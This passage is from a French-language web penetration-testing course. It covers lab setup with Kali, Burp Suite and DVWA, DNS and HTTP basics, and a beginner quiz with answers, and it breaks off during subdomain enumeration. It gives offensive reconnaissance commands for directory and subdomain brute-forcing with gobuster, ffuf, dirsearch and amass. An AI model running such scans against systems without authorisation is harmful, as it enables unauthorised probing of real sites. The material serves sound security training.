# Pentest Web — De zéro aux techniques avancées

## Table des matières

### SECTION 0 — INTRODUCTION & PRÉ-REQUIS
- [Introduction](#introduction)
- [Pré-requis](#pré-requis)
  - [Kali Linux](#1-kali-linux)
  - [Burp Suite](#2-burp-suite)
  - [Browser DevTools](#3-browser-devtools)
  - [Environnements de pratique](#4-environnements-de-pratique)

### PARTIE A — Niveau Débutant : "How the Web Works"
- [DNS in Detail](#dns-in-detail)
  - [Fonctionnement du DNS](#fonctionnement-du-dns)
  - [Types d'enregistrements DNS courants](#types-denregistrements-dns-courants)
- [HTTP in Detail](#http-in-detail)
  - [Méthodes HTTP (verbes)](#méthodes-http-verbes)
  - [En-têtes HTTP](#en-têtes-http)
  - [Cookies HTTP](#cookies-http)
  - [Authentification HTTP](#authentification-http)
  - [Codes de statut HTTP](#codes-de-statut-http)
- [How Websites Work](#how-websites-work)
  - [Front-end (côté client)](#front-end-côté-client)
  - [Back-end (côté serveur)](#back-end-côté-serveur)
  - [Bases de données](#bases-de-données)
  - [Sessions et état](#sessions-et-état)
- [Putting It All Together](#putting-it-all-together)
  - [Chronologie détaillée d'une requête web](#chronologie-détaillée-dune-requête-web)
- [Outils fondamentaux](#outils-fondamentaux)
  - [curl](#curl)
  - [wget](#wget)
  - [Burp Suite (Basics)](#burp-suite-basics)

### PARTIE B — Niveau Intermédiaire : "Web Hacking"
- [Content Discovery](#content-discovery)
- [Subdomain Enumeration](#subdomain-enumeration)
- [Authentication Bypass](#authentication-bypass)
- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
- [Command Injection](#command-injection)
- [SQL Injection](#sql-injection)
- [IDOR (Insecure Direct Object References)](#idor-insecure-direct-object-references)
- [File Inclusion](#file-inclusion)
- [File Upload Vulnerabilities](#file-upload-vulnerabilities)
- [SSRF (Server-Side Request Forgery)](#ssrf-server-side-request-forgery)
- [XXE (XML External Entity)](#xxe-xml-external-entity)

### PARTIE C — Niveau Avancé 1 : "Burp Suite & OWASP Top 10"
- [Burp Suite Advanced](#burp-suite-advanced)
  - [Module Repeater](#module-repeater)
  - [Module Intruder](#module-intruder)
  - [Module Scanner](#module-scanner)
  - [Autres modules essentiels](#autres-modules-essentiels)
  - [Extensions essentielles](#extensions-essentielles)
- [OWASP Top 10 (2021)](#owasp-top-10-2021--résumé--mapping-vers-labs)
  - [A01:2021 – Broken Access Control](#a012021--broken-access-control)
  - [A02:2021 – Cryptographic Failures](#a022021--cryptographic-failures)
  - [A03:2021 – Injection](#a032021--injection)
  - [A04:2021 – Insecure Design](#a042021--insecure-design)
  - [A05:2021 – Security Misconfiguration](#a052021--security-misconfiguration)
  - [A06:2021 – Vulnerable and Outdated Components](#a062021--vulnerable-and-outdated-components)
  - [A07:2021 – Identification and Authentication Failures](#a072021--identification-and-authentication-failures)
  - [A08:2021 – Software and Data Integrity Failures](#a082021--software-and-data-integrity-failures)
  - [A09:2021 – Security Logging and Monitoring Failures](#a092021--security-logging-and-monitoring-failures)
  - [A10:2021 – Server-Side Request Forgery](#a102021--server-side-request-forgery)

### PARTIE D — Niveau Avancé 2 : "Authentication Attacks"
- [Authentication Mechanisms](#authentication-mechanisms)
- [Password Attacks](#password-attacks)
- [JWT Attacks](#jwt-attacks)
- [OAuth 2.0 Vulnerabilities](#oauth-20-vulnerabilities)
- [Multi-Factor Authentication Bypasses](#multi-factor-authentication-bypasses)
- [Session Management Vulnerabilities](#session-management-vulnerabilities)
- [Hands-On Lab: Authentication Bypass Challenge](#hands-on-lab-authentication-bypass-challenge)
- [Quiz](#quiz)

### PARTIE E — Niveau Avancé 3 : "Injection Attacks"
- [Advanced SQLi](#advanced-sqli-time-based-stacked-waf-evasion)
  - [Injection SQL basée sur le temps (Time-based)](#injection-sql-basée-sur-le-temps-time-based)
  - [Requêtes SQL empilées (Stacked Queries)](#requêtes-sql-empilées-stacked-queries)
  - [Contournement de WAF](#contournement-de-waf)
- [NoSQL Injection](#nosql-injection)
- [GraphQL Vulnerabilities](#graphql-vulnerabilities)
- [Server-Side Template Injection](#server-side-template-injection)
- [OS Command Injection Advanced](#os-command-injection-advanced)
- [Prototype Pollution](#prototype-pollution)

### PARTIE F — Niveau Avancé 4 : "Business Logic Flaws"
- [Identifying Business Logic Vulnerabilities](#identifying-business-logic-vulnerabilities)
- [Race Conditions](#race-conditions)
- [Exploiting Discount & Pricing Flaws](#exploiting-discount--pricing-flaws)
- [Abusing Password Reset Functionality](#abusing-password-reset-functionality)
- [Advanced IDOR & Mass Assignment](#advanced-idor--mass-assignment)
- [API Security Issues](#api-security-issues)

### PARTIE G — Niveau Avancé 5 : "Client-Side Attacks"
- [DOM-Based XSS & CSP bypass](#dom-based-xss--csp-bypass)
  - [DOM-Based XSS](#dom-based-xss)
  - [Content Security Policy (CSP)](#content-security-policy-csp)
  - [Techniques de contournement de CSP](#techniques-de-contournement-de-csp)
- [Advanced Cross-Site Scripting](#advanced-cross-site-scripting)
- [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
- [WebSockets Vulnerabilities](#websockets-vulnerabilities)
- [ClickJacking & UI Redressing](#clickjacking--ui-redressing)
- [CORS Misconfigurations](#cors-misconfigurations)

### PARTIE H — Niveau Avancé 6 : "Deserialization & File Attacks"
- [Insecure Deserialization](#insecure-deserialization)
- [Type Juggling & Magic Hashes](#type-juggling--magic-hashes)
- [XXE Exploitation Advanced](#xxe-exploitation-advanced)
- [Advanced File Upload Bypasses](#advanced-file-upload-bypasses)
- [SSRF Exploitation Advanced](#ssrf-exploitation-advanced)
- [Path Traversal & LFI to RCE](#path-traversal--lfi-to-rce)

### PARTIE I — Niveau Expert : "Infrastructure & Cloud"
- [Server-Side Vulnerabilities](#server-side-vulnerabilities)
- [Docker & Container Security](#docker--container-security)
- [Kubernetes Security Issues](#kubernetes-security-issues)
- [Cloud Services Misconfigurations](#cloud-services-misconfigurations)
- [CI/CD Pipeline Vulnerabilities](#cicd-pipeline-vulnerabilities)
- [Infrastructure as Code Security](#infrastructure-as-code-security)

## SECTION 0 — INTRODUCTION & PRÉ-REQUIS


### Introduction

Le pentesting web, ou test d'intrusion web, est l'art d'identifier et d'exploiter les vulnérabilités des applications web avant que les attaquants malveillants ne le fassent. Dans un monde où les entreprises déplacent leurs activités et leurs données sensibles vers le cloud, la sécurité des applications web est devenue cruciale. Ce guide vous accompagnera dans un voyage complet, depuis les bases fondamentales du fonctionnement du web jusqu'aux techniques avancées utilisées par les professionnels de la cybersécurité. Que vous soyez un débutant curieux ou un technicien cherchant à approfondir vos compétences, vous trouverez ici une progression structurée pour maîtriser les outils, méthodologies et concepts essentiels du pentesting web moderne, avec pour objectif de vous préparer aux certifications eWPT et OSWE reconnues dans l'industrie.

### Pré-requis

Pour tirer le meilleur parti de ce guide, vous aurez besoin de mettre en place un environnement de travail adapté. Voici les éléments essentiels à préparer :

#### 1. Kali Linux

Kali Linux est la distribution de référence pour le pentesting. Elle contient la plupart des outils que nous utiliserons.

**Installation :**
- Option 1 : Machine virtuelle (recommandé pour débutants)
  ```bash
  # Télécharger l'image ISO depuis https://www.kali.org/downloads/
  # Installer VirtualBox ou VMware
  # Créer une nouvelle VM avec 4 Go RAM minimum et 50 Go d'espace disque
  ```
- Option 2 : Installation native (dual boot)
- Option 3 : WSL2 pour Windows (limité pour certains outils)

#### 2. Burp Suite

Burp Suite est un proxy d'interception essentiel pour l'analyse et la manipulation du trafic web.

**Installation :**
- Déjà inclus dans Kali Linux
- Configuration initiale :
  ```
  Proxy > Options > Proxy Listeners > Add > Interface: 127.0.0.1:8080 > OK
  ```
- Installation du certificat CA dans votre navigateur

#### 3. Browser DevTools

Les outils de développement des navigateurs modernes sont indispensables pour comprendre et analyser le comportement des applications web.

**Configuration :**
- Firefox (recommandé) : Menu > Plus d'outils > Outils de développement (ou F12)
- Extensions recommandées :
  - FoxyProxy (gestion simplifiée du proxy)
  - Wappalyzer (identification des technologies)
  - Cookie Editor (manipulation des cookies)

#### 4. Environnements de pratique

Pour s'exercer en toute légalité, nous utiliserons des environnements vulnérables contrôlés :

**DVWA (Damn Vulnerable Web Application) :**
```bash
# Installation via Docker
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 vulnerables/web-dvwa

# Accès : http://localhost
# Identifiants par défaut : admin / password
```

**OWASP Juice Shop :**
```bash
# Installation via Docker
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop

# Accès : http://localhost:3000
```

**En clair, pour un débutant :**
Ces outils forment votre laboratoire de hacking éthique. Kali Linux est votre système d'exploitation spécialisé, Burp Suite est votre microscope pour examiner le trafic web, les DevTools sont vos lunettes pour voir l'invisible dans les pages web, et les applications vulnérables sont vos cobayes pour pratiquer sans risque légal.
## PARTIE A — Niveau Débutant : "How the Web Works"

### DNS in Detail

Le Domain Name System (DNS) est l'annuaire téléphonique d'Internet. Il traduit les noms de domaine conviviaux (comme google.com) en adresses IP numériques (comme 142.250.74.110) que les ordinateurs utilisent pour s'identifier sur le réseau.

#### Fonctionnement du DNS

Le processus de résolution DNS se déroule en plusieurs étapes :

1. **Requête initiale** : Votre navigateur demande l'adresse IP de "example.com" à votre résolveur DNS local
2. **Serveurs racines** : Si non mis en cache, votre résolveur interroge les serveurs racines (.)
3. **Serveurs TLD** : Les serveurs racines dirigent vers les serveurs TLD (.com, .org, etc.)
4. **Serveurs autoritaires** : Les serveurs TLD dirigent vers les serveurs DNS du domaine spécifique
5. **Résolution finale** : L'adresse IP est renvoyée à votre navigateur qui peut alors se connecter au serveur

#### Démonstration avec `dig +trace`

La commande `dig +trace` permet de visualiser ce processus étape par étape :

```bash
$ dig +trace example.com

; <<>> DiG 9.16.1-Ubuntu <<>> +trace example.com
;; global options: +cmd
.                       86400   IN      NS      a.root-servers.net.
.                       86400   IN      NS      b.root-servers.net.
[...autres serveurs racines...]

;; Received 262 bytes from 192.168.1.1#53(192.168.1.1) in 28 ms

com.                    172800  IN      NS      a.gtld-servers.net.
com.                    172800  IN      NS      b.gtld-servers.net.
[...autres serveurs TLD...]

;; Received 1173 bytes from 198.41.0.4#53(a.root-servers.net) in 83 ms

example.com.            172800  IN      NS      a.iana-servers.net.
example.com.            172800  IN      NS      b.iana-servers.net.

;; Received 170 bytes from 192.33.14.30#53(b.gtld-servers.net) in 128 ms

example.com.            86400   IN      A       93.184.216.34

;; Received 87 bytes from 199.43.135.53#53(a.iana-servers.net) in 65 ms
```

#### Types d'enregistrements DNS courants

- **A** : Adresse IPv4 d'un domaine
- **AAAA** : Adresse IPv6 d'un domaine
- **CNAME** : Alias vers un autre nom de domaine
- **MX** : Serveurs de messagerie pour le domaine
- **TXT** : Informations textuelles (souvent utilisées pour la vérification SPF, DKIM)
- **NS** : Serveurs de noms autoritaires pour le domaine
- **SOA** : Informations administratives sur la zone DNS

**En clair, pour un débutant :**
Le DNS est comme un GPS pour Internet. Quand vous tapez "facebook.com", votre ordinateur consulte une série d'annuaires (serveurs DNS) pour trouver l'adresse exacte du serveur de Facebook, comme vous consulteriez un annuaire pour trouver le numéro d'un restaurant.

### HTTP in Detail

HTTP (HyperText Transfer Protocol) est le protocole qui permet la communication entre votre navigateur et les serveurs web. C'est le langage que parlent les applications web.

#### Méthodes HTTP (verbes)

- **GET** : Demande de récupération de données (sans modification)
- **POST** : Envoi de données pour traitement (formulaires, fichiers)
- **PUT** : Mise à jour complète d'une ressource
- **PATCH** : Mise à jour partielle d'une ressource
- **DELETE** : Suppression d'une ressource
- **HEAD** : Similaire à GET mais ne récupère que les en-têtes
- **OPTIONS** : Découverte des méthodes supportées par le serveur

#### En-têtes HTTP

Les en-têtes HTTP fournissent des métadonnées sur la requête ou la réponse :

```
# Exemple d'en-têtes de requête
GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/xhtml+xml
Cookie: session=abc123; user_id=42
Referer: https://www.google.com/
```

```
# Exemple d'en-têtes de réponse
HTTP/1.1 200 OK
Date: Mon, 23 May 2022 22:38:34 GMT
Server: Apache/2.4.38 (Debian)
Content-Type: text/html; charset=UTF-8
Content-Length: 138
Set-Cookie: session=xyz789; HttpOnly; Secure
```

#### Cookies HTTP

Les cookies sont de petits morceaux de données stockés par le navigateur :
- Permettent de maintenir l'état entre les requêtes (sessions)
- Stockent les préférences utilisateur
- Suivent le comportement des utilisateurs (analytics)

Structure d'un cookie :
```
Set-Cookie: nom=valeur; Expires=date; Path=/; Domain=domaine; Secure; HttpOnly; SameSite=Strict
```

#### Authentification HTTP

Méthodes courantes d'authentification :

1. **Basic Auth** : Identifiants encodés en Base64 dans l'en-tête
   ```
   Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
   ```

2. **Digest Auth** : Version plus sécurisée de Basic Auth avec hachage

3. **Bearer Token** : Utilisation de jetons (souvent JWT)
   ```
   Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
   ```

4. **OAuth** : Protocole d'autorisation pour applications tierces

5. **API Keys** : Clés spécifiques à l'application
   ```
   X-API-Key: abcdef123456
   ```

#### Codes de statut HTTP

Les codes de statut indiquent le résultat d'une requête HTTP :

- **1xx** : Informatif
  - 100 Continue

- **2xx** : Succès
  - 200 OK
  - 201 Created
  - 204 No Content

- **3xx** : Redirection
  - 301 Moved Permanently
  - 302 Found
  - 304 Not Modified

- **4xx** : Erreur client
  - 400 Bad Request
  - 401 Unauthorized
  - 403 Forbidden
  - 404 Not Found
  - 405 Method Not Allowed

- **5xx** : Erreur serveur
  - 500 Internal Server Error
  - 502 Bad Gateway
  - 503 Service Unavailable

**En clair, pour un débutant :**
HTTP est comme le langage parlé entre votre navigateur et les sites web. Les verbes HTTP (GET, POST) sont les actions que vous demandez, les en-têtes sont les détails de votre conversation, les cookies sont comme des bracelets d'identification que le site vous donne, et les codes de statut sont les réponses du serveur (200 = "voici ce que tu voulais", 404 = "je ne trouve pas ça").

### How Websites Work

Une application web moderne est composée de plusieurs couches qui interagissent entre elles.

#### Front-end (côté client)

Le front-end est ce que l'utilisateur voit et avec quoi il interagit :

- **HTML** : Structure du contenu
- **CSS** : Style et mise en page
- **JavaScript** : Interactivité et comportement dynamique

Exemple simplifié :
```html
<!DOCTYPE html>
<html>
<head>
    <title>Ma page web</title>
    <style>
        /* CSS */
        body { font-family: Arial; }
        .button { background-color: blue; color: white; }
    </style>
</head>
<body>
    <h1>Bienvenue</h1>
    <button class="button" onclick="alert('Bonjour!')">Cliquez-moi</button>
    
    <script>
        // JavaScript
        document.querySelector('.button').addEventListener('click', function() {
            console.log('Bouton cliqué');
        });
    </script>
</body>
</html>
```

#### Back-end (côté serveur)

Le back-end traite la logique métier et gère les données :

- **Langages** : PHP, Python, Ruby, Java, Node.js, etc.
- **Frameworks** : Laravel, Django, Rails, Spring, Express, etc.
- **APIs** : Points d'accès pour les données et fonctionnalités

Exemple simplifié en PHP :
```php
<?php
// Connexion à la base de données
$db = new PDO('mysql:host=localhost;dbname=app', 'user', 'password');

// Traitement d'une requête
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = password_hash($_POST['password'], PASSWORD_DEFAULT);
    
    // Insertion dans la base de données
    $stmt = $db->prepare('INSERT INTO users (username, password) VALUES (?, ?)');
    $stmt->execute([$username, $password]);
    
    // Redirection
    header('Location: /success.php');
    exit;
}
?>
```

#### Bases de données

Les bases de données stockent et organisent les informations :

- **Relationnelles** : MySQL, PostgreSQL, SQLite
- **NoSQL** : MongoDB, Redis, Cassandra
- **Opérations CRUD** : Create, Read, Update, Delete

Exemple de requête SQL :
```sql
-- Création d'une table
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) UNIQUE,
    password VARCHAR(255),
    email VARCHAR(100),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Lecture de données
SELECT username, email FROM users WHERE id = 42;
```

#### Sessions et état

HTTP est sans état par nature, mais les applications ont besoin de maintenir l'état utilisateur :

- **Sessions côté serveur** : ID de session stocké dans un cookie, données sur le serveur
- **Stockage côté client** : Cookies, localStorage, sessionStorage
- **Tokens** : JWT (JSON Web Tokens) pour l'authentification sans état

Exemple de gestion de session en PHP :
```php
<?php
// Démarrer une session
session_start();

// Stocker des données de session
$_SESSION['user_id'] = 42;
$_SESSION['username'] = 'alice';

// Vérifier l'authentification
if (!isset($_SESSION['user_id'])) {
    header('Location: /login.php');
    exit;
}
?>
```

**En clair, pour un débutant :**
Un site web, c'est comme un restaurant : le front-end est la salle à manger (ce que vous voyez), le back-end est la cuisine (où tout se prépare), la base de données est le garde-manger (où sont stockés les ingrédients), et les sessions sont comme votre ticket de commande qui permet au serveur de se souvenir de ce que vous avez commandé.

### Putting It All Together

Voici comment tous ces éléments interagissent lors d'une visite sur un site web :

```
┌─────────────┐                                  ┌─────────────┐
│             │  1. Requête DNS                  │             │
│  Navigateur │ ─────────────────────────────────> Serveur DNS │
│             │  2. Réponse IP                   │             │
└─────────────┘ <───────────────────────────────┘─────────────┘
       │
       │ 3. Requête HTTP GET /index.html
       ▼
┌─────────────┐                                  ┌─────────────┐
│             │  4. Traitement de la requête     │             │
│  Serveur    │ ─────────────────────────────────> Base de     │
│  Web        │  5. Données                      │ données     │
└─────────────┘ <───────────────────────────────┘─────────────┘
       │
       │ 6. Réponse HTTP 200 OK (HTML, CSS, JS)
       ▼
┌─────────────┐
│             │  7. Rendu de la page
│  Navigateur │  8. Exécution JavaScript
│             │  9. Requêtes AJAX supplémentaires
└─────────────┘
```

#### Chronologie détaillée d'une requête web

1. **Résolution DNS** :
   - L'utilisateur saisit "example.com" dans son navigateur
   - Le navigateur demande l'adresse IP au serveur DNS
   - Le serveur DNS renvoie 93.184.216.34

2. **Établissement de la connexion** :
   - Le navigateur initie une connexion TCP avec le serveur (handshake)
   - Si HTTPS, une négociation TLS/SSL a lieu (chiffrement)

3. **Envoi de la requête HTTP** :
   ```
   GET / HTTP/1.1
   Host: example.com
   User-Agent: Mozilla/5.0...
   Accept: text/html,...
   ```

4. **Traitement côté serveur** :
   - Le serveur web reçoit la requête
   - Il exécute le code back-end nécessaire (PHP, Python, etc.)
   - Il interroge la base de données si nécessaire
   - Il génère une réponse HTML

5. **Réponse du serveur** :
   ```
   HTTP/1.1 200 OK
   Date: Mon, 23 May 2022 22:38:34 GMT
   Content-Type: text/html; charset=UTF-8
   
   <!DOCTYPE html>
   <html>...</html>
   ```

6. **Traitement côté client** :
   - Le navigateur reçoit et parse le HTML
   - Il télécharge les ressources additionnelles (CSS, JS, images)
   - Il applique les styles CSS
   - Il exécute le JavaScript
   - Il affiche la page rendue à l'utilisateur

7. **Interactions utilisateur** :
   - L'utilisateur interagit avec la page
   - Le JavaScript gère les événements
   - Des requêtes AJAX peuvent être envoyées au serveur
   - L'interface utilisateur est mise à jour en conséquence

**En clair, pour un débutant :**
Quand vous visitez un site web, c'est comme une chaîne de production : d'abord votre navigateur trouve l'adresse du site (DNS), puis il envoie une lettre de demande (requête HTTP), le serveur lit cette lettre et prépare une réponse en consultant ses dossiers (base de données), puis il renvoie un colis (HTML/CSS/JS) que votre navigateur déballera et assemblera pour vous montrer la page web finale.

### Outils fondamentaux

Pour explorer et interagir avec les applications web, plusieurs outils sont essentiels.

#### curl

curl est un outil en ligne de commande pour transférer des données avec des URL.

Exemples d'utilisation :
```bash
# Requête GET simple
curl https://example.com

# Afficher les en-têtes de réponse
curl -I https://example.com

# Requête POST avec données
curl -X POST -d "username=admin&password=secret" https://example.com/login

# Envoyer des en-têtes personnalisés
curl -H "Authorization: Bearer token123" https://api.example.com/data

# Suivre les redirections
curl -L https://example.com/redirect

# Sauvegarder la sortie dans un fichier
curl -o output.html https://example.com
```

#### wget

wget est un outil pour télécharger des fichiers depuis le web.

Exemples d'utilisation :
```bash
# Télécharger un fichier
wget https://example.com/file.zip

# Télécharger récursivement un site web
wget -r -np -k https://example.com/

# Télécharger avec authentification
wget --user=username --password=password https://example.com/protected/file.pdf

# Reprendre un téléchargement interrompu
wget -c https://example.com/largefile.iso
```

#### Burp Suite (Basics)

Burp Suite est un proxy d'interception qui permet d'examiner et de modifier le trafic entre votre navigateur et les applications web.

**Configuration de base :**
1. Démarrer Burp Suite
2. Configurer votre navigateur pour utiliser le proxy (127.0.0.1:8080)
3. Installer le certificat CA de Burp dans votre navigateur

**Module Proxy (Intercept) :**
- Intercepte les requêtes et réponses
- Permet de modifier les données avant qu'elles ne soient envoyées
- Historique des requêtes pour analyse ultérieure

```
# Exemple de requête interceptée
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

username=admin&password=password123
```

**Module Repeater :**
- Permet de modifier et renvoyer des requêtes
- Utile pour tester différentes entrées
- Affiche les réponses pour analyse

**Workflow de base :**
1. Intercepter une requête avec le Proxy
2. Envoyer la requête au Repeater (Ctrl+R)
3. Modifier les paramètres ou en-têtes
4. Cliquer sur "Send" pour envoyer la requête modifiée
5. Analyser la réponse

**En clair, pour un débutant :**
Ces outils sont vos couteaux suisses pour le web. curl et wget sont comme des télécommandes en ligne de commande pour interagir avec les sites web. Burp Suite est comme une loupe géante qui vous permet de voir et modifier toutes les communications entre votre navigateur et les sites web, comme un détective qui intercepterait et lirait le courrier avant qu'il n'arrive à destination.

### Mini-lab « Walking an application » (DVWA low)

Dans ce mini-lab, nous allons explorer l'application DVWA (Damn Vulnerable Web Application) pour comprendre sa structure et identifier ses fonctionnalités.

#### Préparation

1. Assurez-vous que DVWA est en cours d'exécution :
   ```bash
   docker ps | grep dvwa
   # Si non présent
   docker run -d -p 80:80 vulnerables/web-dvwa
   ```

2. Accédez à http://localhost
3. Connectez-vous avec les identifiants par défaut : admin / password
4. Dans le menu "DVWA Security", définissez le niveau sur "Low"

#### Exploration méthodique

1. **Cartographie de l'application** :
   - Identifiez toutes les pages et fonctionnalités disponibles
   - Notez les paramètres dans les URL
   - Observez les formulaires et leurs champs

2. **Analyse avec Burp Suite** :
   - Activez l'interception dans Burp
   - Naviguez sur le site pour capturer le trafic
   - Examinez les requêtes et réponses

3. **Identification des technologies** :
   - Examinez les en-têtes de réponse pour identifier le serveur
   - Recherchez des indices sur les technologies utilisées (PHP, MySQL)
   - Vérifiez les cookies et leur structure

#### Exercice pratique

1. Accédez à la page "SQL Injection" dans DVWA
2. Interceptez la requête avec Burp Suite
3. Analysez la structure de la requête :
   ```
   GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
   Host: localhost
   Cookie: PHPSESSID=abc123; security=low
   ```
4. Envoyez la requête au Repeater
5. Modifiez le paramètre `id` pour tester différentes valeurs
6. Observez les différentes réponses

#### Rapport d'exploration

Documentez vos découvertes :
- Structure de l'application (pages, fonctionnalités)
- Paramètres et points d'entrée identifiés
- Technologies détectées
- Comportements intéressants observés

**En clair, pour un débutant :**
Ce mini-lab est comme une visite guidée d'une maison aux portes ouvertes. Vous allez explorer chaque pièce (page) de l'application, noter où sont les entrées et les sorties (formulaires, liens), et utiliser Burp Suite comme une caméra pour enregistrer tout ce que vous voyez. C'est la première étape essentielle avant de commencer à chercher des vulnérabilités.

### Quiz Débutant

1. **Quel protocole traduit les noms de domaine en adresses IP ?**
   - A) HTTP
   - B) FTP
   - C) DNS
   - D) SMTP
   
   *Réponse : C) DNS*

2. **Quel code de statut HTTP indique que la ressource demandée n'a pas été trouvée ?**
   - A) 200
   - B) 301
   - C) 404
   - D) 500
   
   *Réponse : C) 404*

3. **Quelle méthode HTTP est généralement utilisée pour envoyer des données de formulaire ?**
   - A) GET
   - B) POST
   - C) PUT
   - D) DELETE
   
   *Réponse : B) POST*

4. **Quel outil est un proxy d'interception permettant d'examiner et de modifier le trafic web ?**
   - A) curl
   - B) wget
   - C) Burp Suite
   - D) Wireshark
   
   *Réponse : C) Burp Suite*

5. **Quelle partie d'une application web est responsable du stockage des données ?**
   - A) Front-end
   - B) Back-end
   - C) Base de données
   - D) Serveur DNS
   
   *Réponse : C) Base de données*
## PARTIE B — Niveau Intermédiaire : "Introduction to Web Hacking"

### Content Discovery

La découverte de contenu est une étape cruciale du pentesting web qui consiste à identifier les fichiers, répertoires et ressources cachés ou non référencés d'une application web.

#### Pourquoi la découverte de contenu est importante

- Révèle des pages d'administration non protégées
- Identifie des fichiers de sauvegarde ou temporaires contenant du code source
- Découvre des API ou endpoints non documentés
- Trouve des versions de développement ou de test
- Révèle des informations sensibles (fichiers de configuration, logs)

#### Méthodes manuelles

1. **Inspection du code source** :
   - Examiner le HTML, CSS et JavaScript pour trouver des références à d'autres pages
   - Rechercher des commentaires contenant des URLs ou des chemins
   - Analyser les fichiers JavaScript pour trouver des endpoints d'API

2. **Manipulation d'URL** :
   - Tester des extensions communes (.bak, .old, .txt, .php~)
   - Essayer des répertoires courants (/admin, /backup, /dev, /test)
   - Modifier les paramètres d'URL pour découvrir des fonctionnalités cachées

#### Outils automatisés

##### gobuster

gobuster est un outil rapide écrit en Go pour bruteforcer les URIs et les noms d'hôtes.

```bash
# Installation sur Kali Linux
apt-get update && apt-get install gobuster

# Découverte de répertoires
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt

# Découverte de fichiers avec extensions spécifiques
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

# Ignorer certains codes de statut
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -b 404,403

# Utiliser l'authentification basique
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -U admin -P password
```

##### ffuf (Fuzz Faster U Fool)

ffuf est un outil de fuzzing web rapide et flexible.

```bash
# Installation sur Kali Linux
apt-get update && apt-get install ffuf

# Découverte de répertoires
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://example.com/FUZZ

# Découverte de fichiers avec extensions
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://example.com/FUZZ -e .php,.txt,.html

# Fuzzing de paramètres
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://example.com/index.php?FUZZ=value

# Fuzzing de valeurs de paramètres
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://example.com/index.php?param=FUZZ

# Filtrer par taille de réponse
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://example.com/FUZZ -fs 4242
```

##### dirsearch

dirsearch est un outil Python simple et efficace conçu pour bruteforcer les répertoires et fichiers.

```bash
# Installation sur Kali Linux
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
pip3 install -r requirements.txt

# Découverte basique
python3 dirsearch.py -u https://example.com -e php,html,js

# Scan récursif
python3 dirsearch.py -u https://example.com -e php,html -r

# Utiliser un dictionnaire personnalisé
python3 dirsearch.py -u https://example.com -e php -w /path/to/wordlist.txt

# Exclure certains codes de statut
python3 dirsearch.py -u https://example.com -e php --exclude-status=404,403
```

#### Wordlists populaires

- **SecLists** : Collection complète de listes pour tests de sécurité
  ```bash
  # Installation
  apt-get install seclists
  # Emplacement
  /usr/share/seclists/Discovery/Web-Content/
  ```

- **dirb** : Listes incluses dans Kali Linux
  ```
  /usr/share/wordlists/dirb/
  ```

- **dirbuster** : Listes plus volumineuses
  ```
  /usr/share/wordlists/dirbuster/
  ```

#### Bonnes pratiques

1. Commencer avec des listes courtes puis passer aux plus volumineuses
2. Ajuster la vitesse pour éviter de surcharger le serveur
3. Filtrer les résultats pour réduire les faux positifs
4. Personnaliser les wordlists en fonction de la technologie cible
5. Vérifier manuellement les résultats intéressants

**En clair, pour un débutant :**
La découverte de contenu, c'est comme chercher des portes cachées dans un bâtiment. Vous utilisez des outils comme gobuster, ffuf ou dirsearch qui essaient systématiquement des milliers de noms de fichiers et dossiers courants pour voir lesquels existent réellement sur le site. C'est souvent ainsi qu'on trouve des zones d'administration non protégées ou des fichiers sensibles oubliés par les développeurs.

### Subdomain Enumeration

L'énumération de sous-domaines consiste à découvrir tous les sous-domaines associés à un domaine principal. C'est une étape cruciale pour élargir la surface d'attaque.

#### Importance de l'énumération de sous-domaines

- Les sous-domaines peuvent héberger des applications différentes avec des vulnérabilités spécifiques
- Certains sous-domaines peuvent être moins sécurisés (environnements de test, développement)
- Élargit considérablement la surface d'attaque
- Peut révéler des services internes exposés par erreur

#### Techniques d'énumération

1. **Recherche passive** :
   - Moteurs de recherche : `site:*.example.com -www`
   - Certificats SSL (Certificate Transparency logs)
   - Archives web (Wayback Machine)
   - Sources publiques (DNS, WHOIS)

2. **Bruteforce** :
   - Test systématique de sous-domaines courants
   - Utilisation de dictionnaires spécialisés

3. **Altération de DNS** :
   - Génération de variations à partir de sous-domaines connus
   - Ajout de préfixes/suffixes courants

#### Outils spécialisés

##### amass

amass est l'un des outils les plus complets pour l'énumération de sous-domaines, combinant plusieurs techniques.

```bash
# Installation sur Kali Linux
apt-get update && apt-get install amass

# Énumération basique
amass enum -d example.com

# Énumération passive uniquement
amass enum -passive -d example.com

# Énumération avec bruteforce
amass enum -brute -d example.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Sortie détaillée
amass enum -d example.com -o subdomains.txt -v
```

##### subfinder

subfinder est un outil rapide écrit en Go qui utilise diverses sources publiques.

```bash
# Installation
GO111MODULE=on go get -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder

# Énumération basique
subfinder -d example.com

# Utilisation de sources spécifiques
subfinder -d example.com -sources crtsh,dnsdumpster,virustotal

# Sortie vers un fichier
subfinder -d example.com -o subdomains.txt

# Résolution DNS des sous-domaines trouvés
subfinder -d example.com -resolve
```

##### Autres outils utiles

- **Sublist3r** : Outil Python utilisant plusieurs moteurs de recherche et APIs
  ```bash
  git clone https://github.com/aboul3la/Sublist3r.git
  cd Sublist3r
